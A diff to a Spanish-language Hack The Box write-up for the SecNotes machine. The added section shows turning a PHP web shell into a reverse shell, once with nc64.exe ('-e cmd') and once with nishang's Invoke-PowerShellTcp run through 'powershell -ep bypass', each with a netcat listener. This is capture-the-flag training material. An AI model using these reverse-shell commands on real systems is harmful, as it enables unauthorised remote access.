@@ -324,19 +324,69 @@ put cmd.php
 
 Una vez subida, desde nuestro navegador, podemos acceder a ella añadiendo _/cmd.php?cmd=comando_ al url.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/32.png)
-
 Podemos ejecutar _ipconfig_ para corroborar que nos encontramos dentro de la máquina víctima.
 
-![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/33.png)
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/32.png)
 
 O _whoami_ para determinar que usuario somos.
 
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/33.png)
+
+Ya a partir de este punto, lo que nos interesa como atacantes, es ganar acceso al sistema a través de una consola propiamente, para lo cual tenemos dos opciones:
+
+Podemos usar [Netcat](https://eternallybored.org/misc/netcat/), para lo cual descargaremos la última versión, subiremos al servidor web la versión compilada para 64 bits.
+
+```
+put nc64.exe
+```
+
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/34.png)
+
+Nos pondremos en escucha a través del puerto que determinemos.
+
+```
+sudo rlwrap nc -nlvp <puertoCualquiera>
+```
+
+Para finalmente a través del navegador añadir lo siguiente al url.
+
+```
+/cmd.php?cmd=nc64.exe -e cmd <nuestraDirecciónIP> <puertoCualquiera>
+```
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/35.png)
 
+O por su parte podemos usar `Invoke-PowerShellTcp` de _nishang_, para lo cual descargaremos el script.
+
+```
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+```
+
+Añadimos lo siguiente al final del script.
+
+```
+Invoke-PowerShellTcp -Reverse -IPAddress <nuestraDirecciónIP> -Port <puertoCualquiera>
+```
+
+Lo subimos al servidor web.
+
+```
+put Invoke-PowerShellTcp.ps1
+```
+
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/36.png)
+
+Nos ponemos en escucha a través del puerto que determinamos anteriormente.
+
+```
+sudo rlwrap nc -nlvp <puertoCualquiera>
+```
+
+Para finalmente a través del navegador añadir lo siguiente al url.
+
+```
+/cmd.php?cmd=powershell -ep bypass .\Invoke-PowerShellTcp
+```
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/37.png)
 
